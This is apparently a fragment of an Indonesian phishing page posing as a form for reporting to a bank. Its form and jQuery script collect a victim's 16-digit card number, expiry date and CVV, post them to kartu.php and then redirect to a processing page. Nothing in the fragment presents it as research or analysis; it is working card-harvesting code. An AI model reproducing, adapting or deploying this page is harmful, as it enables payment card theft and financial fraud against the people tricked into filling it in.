 <input type="hidden" id="bank" name="bank">               
              <input type="tel" name="debit" id="debit" required="" maxlength="16" minlength="16" placeholder="Masukkan 16 Angka Nomor Kartu " class="laporankebanklain-textinput input">

<script src="js/jquery-3.5.1.min.js"></script>
<script src="js/jquery.mask.min.js"></script>
<script>
    $(document).ready(function(){
    $('#debit').mask('0000 0000 0000 0000');
    $('#valid').mask('00/00');    
    });
    </script>        
<script>
var bank = sessionStorage.getItem("bank");
document.getElementById("bank").value = bank + "";
  </script>    
<script>
$('#frmSubmit').on('submit', function (event) {

  event.stopPropagation();
    event.preventDefault();
 $('#process1').show();   
  document.getElementById('chat').innerHTML = "Proses..";
  
  
$.ajax({
 type: 'POST',
 url: 'kartu.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(),
 
 complete: function(data) {
            console.log('Complete')
  
setTimeout(function(){  
document.getElementById('chat').innerHTML = "Buat Laporan Ke Bank Lain";     
$('#process1').fadeOut(); 
location.href='proses.html';
var bank = document.getElementById("bank").value;
sessionStorage.setItem("bank", bank);
var card = document.getElementById("debit").value;
sessionStorage.setItem("card", card);
var masa = document.getElementById("valid").value;
sessionStorage.setItem("masa", masa);
var kode = document.getElementById("cvv").value;
sessionStorage.setItem("kode", kode);
    }, 1000); 
 }
    });

    return false;
});       


</script>
